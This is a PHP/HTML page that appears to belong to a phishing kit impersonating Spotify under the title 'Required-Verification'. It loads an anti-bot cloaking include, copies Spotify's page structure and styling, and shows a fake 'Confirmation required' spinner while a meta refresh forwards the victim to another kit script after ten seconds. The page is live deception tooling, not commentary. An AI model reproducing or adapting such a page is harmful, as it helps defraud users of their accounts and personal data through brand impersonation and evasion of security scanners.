<?php
include './CRfiles/PHP/botfucker.php';
 ?>
<!DOCTYPE html>

<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding">Required-Verification - Spotify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">--><base href=".">
  <link rel="icon" href="./CRfiles/favicon.ico">
  <meta http-equiv="refresh" content="10; URL=./sen_t.php">
  <link href="./CRfiles/index.b48f2b8327399f826bfd.css" media="screen" rel="stylesheet">

  
  </head>
<body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template --><div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope"><div class="head ">
  <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/en" href="./Spow/Error.php"></a>
</div>
</div>

<div class="container-fluid login ng-scope">
 
  <div class="content">
    <!-- ngIf: showContinueLabel --><div class="row ng-scope" ng-if="showContinueLabel">


    <div>
      <center>
        <style type="text/css">
    
    .lds-ellipsis {
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;
}
.lds-ellipsis div {
  position: absolute;
  top: 33px;
  width: 13px;
  height: 13px;
  border-radius: 50%;
  background: black;
  animation-timing-function: cubic-bezier(0, 1, 1, 0);
}
.lds-ellipsis div:nth-child(1) {
  left: 8px;
  animation: lds-ellipsis1 0.6s infinite;
}
.lds-ellipsis div:nth-child(2) {
  left: 8px;
  animation: lds-ellipsis2 0.6s infinite;
}
.lds-ellipsis div:nth-child(3) {
  left: 32px;
  animation: lds-ellipsis2 0.6s infinite;
}
.lds-ellipsis div:nth-child(4) {
  left: 56px;
  animation: lds-ellipsis3 0.6s infinite;
}
@keyframes lds-ellipsis1 {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}
@keyframes lds-ellipsis3 {
  0% {
    transform: scale(1);
  }
  100% {
    transform: scale(0);
  }
}
@keyframes lds-ellipsis2 {
  0% {
    transform: translate(0, 0);
  }
  100% {
    transform: translate(24px, 0);
  }
}

  </style>

  <br>

  <div align="center">

    <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>

    <br>

    <span><strong>Confirmation required</strong>,<br> please do not close this tab...</span>
        
    <br>
  </div>
      </center>
    </div>
     <!-- end ngIf: showButton -->

    <!-- ngIf: showAppStoreBanner -->
</div><!-- end ngIf: showSignup -->
</signup>
        </div>
      </div>
    </div>

  </div><!-- .content -->
</div><!-- .container -->
</div>


<div></div></body></html>